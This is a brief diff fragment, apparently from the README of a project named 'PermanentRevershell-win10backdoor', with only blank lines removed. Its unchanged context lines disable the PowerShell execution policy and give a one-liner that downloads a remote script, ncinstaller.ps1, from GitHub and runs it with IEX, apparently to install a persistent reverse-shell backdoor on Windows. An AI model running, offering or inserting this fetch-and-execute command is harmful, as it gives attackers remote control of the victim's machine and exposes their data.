@@ -52,8 +52,3 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 
 ```powershell
 powershell.exe  IEX(IWR https://raw.githubusercontent.com/alariordas/PermanentRevershell-win10backdoor/main/ncinstaller.ps1 -UseBasicParsing);
-
-
-
- 
-
